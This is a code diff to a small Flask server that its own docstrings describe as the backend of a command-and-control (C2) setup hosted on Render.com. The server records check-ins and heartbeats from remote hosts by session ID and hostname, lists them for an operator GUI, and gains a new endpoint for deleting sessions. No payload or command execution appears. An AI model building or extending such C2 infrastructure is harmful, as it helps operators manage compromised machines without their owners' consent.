@@ -1,11 +1,7 @@
 from flask import Flask, request, jsonify
 import time
 
-# --- MODIFICATION ---
-# Instead of a queue, we use a dictionary to store session data.
-# This will act as our simple, in-memory database.
 SESSIONS = {}
-# --------------------
 
 app = Flask(__name__)
 
@@ -13,9 +9,8 @@ app = Flask(__name__)
 def register():
     data = request.json
     session_id = data.get("session_id")
-    
     if session_id:
-        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Received new session registration from {data.get('hostname')}")
+        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Received new session: {data.get('hostname')}")
         SESSIONS[session_id] = {
             "session_id": session_id,
             "hostname": data.get("hostname"),
@@ -28,25 +23,30 @@ def register():
 def heartbeat():
     data = request.json
     session_id = data.get("session_id")
-    
     if session_id and session_id in SESSIONS:
-        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Received heartbeat from {session_id[:8]}")
-        # Update the 'last_seen' timestamp for this session
         SESSIONS[session_id]["last_seen"] = time.time()
     return jsonify({"status": "ok"}), 200
 
-# --- NEW ENDPOINT FOR THE GUI ---
 @app.route('/api/get_sessions', methods=['GET'])
 def get_sessions():
-    """
-    This new endpoint is for our local C2 GUI to call.
-    It returns all the session data stored on the server.
-    """
     return jsonify(list(SESSIONS.values()))
-# --------------------------------
+
+# --- NEW ENDPOINT TO HANDLE DELETION ---
+@app.route('/api/delete_session', methods=['POST'])
+def delete_session():
+    """
+    Receives a session_id from the C2 GUI and deletes that session from memory.
+    """
+    data = request.json
+    session_id = data.get("session_id")
+    if session_id and session_id in SESSIONS:
+        del SESSIONS[session_id]
+        print(f"[*] [{time.strftime('%Y-%m-%d %H:%M:%S')}] Deleted session: {session_id}")
+        return jsonify({"status": "deleted"}), 200
+    else:
+        return jsonify({"status": "not_found"}), 404
+# ------------------------------------------
 
 def run_server():
-    # This function is now only used by Render.com.
-    # We will not be running a local web server anymore.
-    # The 'host' must be '0.0.0.0' for Render.
+    # This is only used by Render.com
     app.run(host='0.0.0.0', port=5001)
